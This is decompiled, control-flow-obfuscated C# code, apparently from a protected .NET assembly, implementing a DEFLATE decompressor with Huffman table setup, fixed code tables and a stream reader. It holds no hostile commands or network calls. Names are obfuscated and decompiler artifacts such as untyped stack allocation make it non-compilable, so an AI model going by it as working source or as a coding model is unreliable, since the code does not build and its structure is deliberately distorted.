              *(int*) ((IntPtr) voidPtr + 56) = (int) \u0006.\u0006.\u0001(*(int*) ((IntPtr) voidPtr + 8));
              if (*(int*) ((IntPtr) voidPtr + 52) <= 9)
              {
                do
                {
                  this.\u0001[*(int*) ((IntPtr) voidPtr + 56)] = (short) (*(int*) ((IntPtr) voidPtr + 48) << 4 | *(int*) ((IntPtr) voidPtr + 52));
                  *(int*) ((IntPtr) voidPtr + 56) = *(int*) ((IntPtr) voidPtr + 56) + (1 << *(int*) ((IntPtr) voidPtr + 52));
                }
                while (*(int*) ((IntPtr) voidPtr + 56) < 512);
              }
              else
              {
                *(int*) ((IntPtr) voidPtr + 60) = (int) this.\u0001[*(int*) ((IntPtr) voidPtr + 56) & 511];
                *(int*) ((IntPtr) voidPtr + 64) = 1 << (*(int*) ((IntPtr) voidPtr + 60) & 15);
                *(int*) ((IntPtr) voidPtr + 60) = -(*(int*) ((IntPtr) voidPtr + 60) >> 4);
                do
                {
                  this.\u0001[*(int*) ((IntPtr) voidPtr + 60) | *(int*) ((IntPtr) voidPtr + 56) >> 9] = (short) (*(int*) ((IntPtr) voidPtr + 48) << 4 | *(int*) ((IntPtr) voidPtr + 52));
                  *(int*) ((IntPtr) voidPtr + 56) = *(int*) ((IntPtr) voidPtr + 56) + (1 << *(int*) ((IntPtr) voidPtr + 52));
                }
                while (*(int*) ((IntPtr) voidPtr + 56) < *(int*) ((IntPtr) voidPtr + 64));
              }
              numArray2[*(int*) ((IntPtr) voidPtr + 52)] = *(int*) ((IntPtr) voidPtr + 8) + (1 << 16 - *(int*) ((IntPtr) voidPtr + 52));
            }
            *(int*) ((IntPtr) voidPtr + 48) = *(int*) ((IntPtr) voidPtr + 48) + 1;
          }
        }
      }

      public unsafe int \u0001([In] \u0006.\u0002 obj0)
      {
        int num1;
        void* voidPtr;
        if (true)
        {
          int num2 = 16;
          int index;
          int num3;
          while (true)
          {
            // ISSUE: untyped stack allocation
            voidPtr = (void*) __untypedstackalloc(num2);
            if ((index = obj0.\u0001(9)) >= 0)
            {
              if ((num1 = (int) this.\u0001[index]) >= 0)
              {
                if (true)
                {
                  obj0.\u0001(num1 & 15);
                  num3 = num1;
                  if (false)
                    num2 = num3;
                  else
                    break;
                }
                else
                  goto label_8;
              }
              else
                goto label_5;
            }
            else
              goto label_13;
          }
          return num3 >> 4;
label_5:
          *(int*) voidPtr = -(num1 >> 4);
          *(int*) ((IntPtr) voidPtr + 4) = num1 & 15;
          int num4;
          if ((num4 = obj0.\u0001(*(int*) ((IntPtr) voidPtr + 4))) >= 0)
          {
            int num5 = (int) this.\u0001[*(int*) voidPtr | num4 >> 9];
            obj0.\u0001(num5 & 15);
            return num5 >> 4;
          }
          *(int*) ((IntPtr) voidPtr + 8) = obj0.\u0001();
          index = obj0.\u0001(*(int*) ((IntPtr) voidPtr + 8));
          num1 = (int) this.\u0001[*(int*) voidPtr | index >> 9];
label_8:
          if (true)
          {
            if ((num1 & 15) > *(int*) ((IntPtr) voidPtr + 8))
              return -1;
            obj0.\u0001(num1 & 15);
            if (true)
              return num1 >> 4;
            goto label_14;
          }
          else
            goto label_16;
label_13:
          *(int*) ((IntPtr) voidPtr + 12) = obj0.\u0001();
          index = obj0.\u0001(*(int*) ((IntPtr) voidPtr + 12));
label_14:
          num1 = (int) this.\u0001[index];
        }
        if (num1 < 0)
          goto label_18;
label_16:
        if ((num1 & 15) <= *(int*) ((IntPtr) voidPtr + 12))
        {
          obj0.\u0001(num1 & 15);
          return num1 >> 4;
        }
label_18:
        return -1;
      }
    }

    internal sealed class \u0005
    {
      private static readonly int[] \u0001;
      private static readonly int[] \u0002;
      private byte[] \u0001;
      private byte[] \u0002;
      private \u0006.\u0004 \u0001;
      private int \u0001;
      private int \u0002;
      private int \u0003;
      private int \u0004;
      private int \u0005;
      private int \u0006;
      private byte \u0001;
      private int \u0007;
      private static readonly int[] \u0003;

      public unsafe bool \u0001([In] \u0006.\u0002 obj0)
      {
        int num1 = 8;
        void* voidPtr;
        if (num1 != 0)
        {
          // ISSUE: untyped stack allocation
          voidPtr = (void*) __untypedstackalloc(num1);
          goto label_43;
        }
label_2:
        int num2;
        int num3;
        int num4;
        int num5;
        switch (num1)
        {
          case 0:
            this.\u0002 = obj0.\u0001(5);
            if (this.\u0002 < 0)
              return false;
            this.\u0002 += 257;
            obj0.\u0001(5);
            this.\u0001 = 1;
            goto case 1;
          case 1:
            this.\u0003 = obj0.\u0001(5);
            if (this.\u0003 >= 0)
            {
              ++this.\u0003;
              obj0.\u0001(5);
              this.\u0005 = this.\u0002 + this.\u0003;
              this.\u0002 = new byte[this.\u0005];
              this.\u0001 = 2;
              goto case 2;
            }
            else
              break;
          case 2:
            this.\u0004 = obj0.\u0001(4);
            if (this.\u0004 < 0)
              return false;
            this.\u0004 += 4;
            obj0.\u0001(4);
            this.\u0001 = new byte[19];
            this.\u0007 = 0;
            goto label_12;
          case 3:
label_19:
            num4 = this.\u0007;
            num5 = this.\u0004;
            if (true)
            {
              if (num4 < num5)
              {
                *(int*) voidPtr = obj0.\u0001(3);
                goto label_14;
              }
              else
              {
                this.\u0001 = new \u0006.\u0004(this.\u0001);
                this.\u0001 = (byte[]) null;
                this.\u0007 = 0;
                if (true)
                {
                  this.\u0001 = 4;
                  goto case 4;
                }
                else
                  break;
              }
            }
            else
              goto label_25;
          case 4:
label_27:
            int num6;
            if (((num6 = this.\u0001.\u0001(obj0)) & -16) == 0)
            {
              if (true)
              {
                byte[] numArray = this.\u0002;
                num2 = this.\u0007++;
                int index = num2;
                int num7 = (int) (this.\u0001 = (byte) num6);
                numArray[index] = (byte) num7;
                int num8 = this.\u0007;
                num5 = this.\u0005;
                num4 = num8;
                goto label_25;
              }
              else
                goto label_12;
            }
            else
            {
              if (num6 < 0)
                return false;
              if (num6 >= 17)
                this.\u0001 = (byte) 0;
              this.\u0006 = num6 - 16;
              if (true)
              {
                this.\u0001 = 5;
                goto case 5;
              }
              else
                goto case 5;
            }
          case 5:
            *(int*) ((IntPtr) voidPtr + 4) = \u0006.\u0005.\u0002[this.\u0006];
            num3 = obj0.\u0001(*(int*) ((IntPtr) voidPtr + 4));
            if (num3 < 0)
              return false;
            goto label_36;
          default:
            goto label_43;
        }
        return false;
label_12:
        this.\u0001 = 3;
        goto label_19;
label_14:
        int num9 = *(int*) voidPtr;
        if (false)
          return num9 != 0;
        if (num9 < 0)
          return false;
        obj0.\u0001(3);
        if (true)
        {
          this.\u0001[\u0006.\u0005.\u0003[this.\u0007]] = (byte) *(int*) voidPtr;
          ++this.\u0007;
          goto label_19;
        }
        else
          goto label_36;
label_25:
        if (num4 == num5)
          return true;
        goto label_27;
label_36:
        obj0.\u0001(*(int*) ((IntPtr) voidPtr + 4));
        num3 += \u0006.\u0005.\u0001[this.\u0006];
        while (num3-- > 0)
        {
          byte[] numArray = this.\u0002;
          num2 = this.\u0007++;
          int index = num2;
          int num10 = (int) this.\u0001;
          numArray[index] = (byte) num10;
        }
        if (true)
        {
          if (this.\u0007 == this.\u0005)
            return true;
          this.\u0001 = 4;
        }
        else
          goto label_14;
label_43:
        int num11 = this.\u0001;
        if (true)
          num2 = num11;
        num1 = num2;
        goto label_2;
      }

      public \u0006.\u0004 \u0001()
      {
        byte[] destinationArray = new byte[this.\u0002];
        Array.Copy((Array) this.\u0002, 0, (Array) destinationArray, 0, this.\u0002);
        return new \u0006.\u0004(destinationArray);
      }

      public \u0006.\u0004 \u0002()
      {
        byte[] destinationArray = new byte[this.\u0003];
        Array.Copy((Array) this.\u0002, this.\u0002, (Array) destinationArray, 0, this.\u0003);
        return new \u0006.\u0004(destinationArray);
      }

      static \u0005()
      {
label_0:
        int length1 = 3;
        int length2;
        while (true)
        {
          int[] numArray1 = new int[length1];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray1, __fieldref (\u0003.\u0001));
          \u0006.\u0005.\u0001 = numArray1;
          do
          {
            if (true)
            {
              length2 = 3;
              if (length2 != 0)
              {
                int[] numArray2 = new int[length2];
                // ISSUE: field reference
                RuntimeHelpers.InitializeArray((Array) numArray2, __fieldref (\u0003.\u0001));
                \u0006.\u0005.\u0002 = numArray2;
              }
              else
                goto label_6;
            }
            else
              goto label_0;
          }
          while (false);
          length2 = 19;
label_6:
          if (length2 == 0)
            length1 = length2;
          else
            break;
        }
        int[] numArray = new int[length2];
        // ISSUE: field reference
        RuntimeHelpers.InitializeArray((Array) numArray, __fieldref (\u0003.\u0001));
        \u0006.\u0005.\u0003 = numArray;
      }
    }

    internal sealed class \u0006
    {
      private static readonly int[] \u0001;
      private static readonly byte[] \u0001;
      private static readonly short[] \u0001;
      private static readonly byte[] \u0002;
      private static readonly short[] \u0002;
      private static readonly byte[] \u0003;

      public static short \u0001([In] int obj0) => (short) ((int) \u0006.\u0006.\u0001[obj0 & 15] << 12 | (int) \u0006.\u0006.\u0001[obj0 >> 4 & 15] << 8 | (int) \u0006.\u0006.\u0001[obj0 >> 8 & 15] << 4 | (int) \u0006.\u0006.\u0001[obj0 >> 12]);

      static \u0006()
      {
label_0:
        \u0006.\u0006.\u0001 = new int[19]
        {
          16,
          17,
          18,
          0,
          8,
          7,
          9,
          6,
          10,
          5,
          11,
          4,
          12,
          3,
          13,
          2,
          14,
          1,
          15
        };
label_1:
        \u0006.\u0006.\u0001 = new byte[16]
        {
          (byte) 0,
          (byte) 8,
          (byte) 4,
          (byte) 12,
          (byte) 2,
          (byte) 10,
          (byte) 6,
          (byte) 14,
          (byte) 1,
          (byte) 9,
          (byte) 5,
          (byte) 13,
          (byte) 3,
          (byte) 11,
          (byte) 7,
          (byte) 15
        };
        \u0006.\u0006.\u0001 = new short[286];
        \u0006.\u0006.\u0002 = new byte[286];
        int index;
        if (true)
        {
          index = 0;
          goto label_23;
        }
        else
          goto label_7;
label_4:
        if (true)
        {
          \u0006.\u0006.\u0002[index++] = (byte) 8;
          goto label_23;
        }
        else
          goto label_8;
label_7:
        \u0006.\u0006.\u0002[index++] = (byte) 9;
label_8:
        if (index < 256)
        {
          \u0006.\u0006.\u0001[index] = \u0006.\u0006.\u0001(256 + index << 7);
          goto label_7;
        }
        else
        {
          if (true)
          {
            while (true)
            {
              int num1 = index;
label_13:
              if (num1 < 280)
              {
                \u0006.\u0006.\u0001[index] = \u0006.\u0006.\u0001(index - 256 << 9);
                if (true)
                  \u0006.\u0006.\u0002[index++] = (byte) 7;
                else
                  goto label_0;
              }
              else
              {
                for (; index < 286; \u0006.\u0006.\u0002[index++] = (byte) 8)
                  \u0006.\u0006.\u0001[index] = \u0006.\u0006.\u0001(index - 88 << 8);
                \u0006.\u0006.\u0002 = new short[30];
                \u0006.\u0006.\u0003 = new byte[30];
                if (true)
                {
                  int num2;
                  for (index = 0; index < 30; index = num2 + 1)
                  {
                    \u0006.\u0006.\u0002[index] = \u0006.\u0006.\u0001(index << 11);
                    if (true)
                    {
                      \u0006.\u0006.\u0003[index] = (byte) 5;
                      num2 = index;
                      if (false)
                      {
                        num1 = num2;
                        goto label_13;
                      }
                    }
                    else
                      goto label_1;
                  }
                  break;
                }
                goto label_4;
              }
            }
            return;
          }
          goto label_0;
        }
label_23:
        if (index < 144)
        {
          \u0006.\u0006.\u0001[index] = \u0006.\u0006.\u0001(48 + index << 8);
          goto label_4;
        }
        else
          goto label_8;
      }
    }

    internal sealed class \u0007 : MemoryStream
    {
      public int \u0001() => this.ReadByte() | this.ReadByte() << 8;

      public int \u0002() => this.\u0001() | this.\u0001() << 16;

      public \u0007([In] byte[] obj0)
        : base(obj0, false)
      {
      }
    }
  }
}
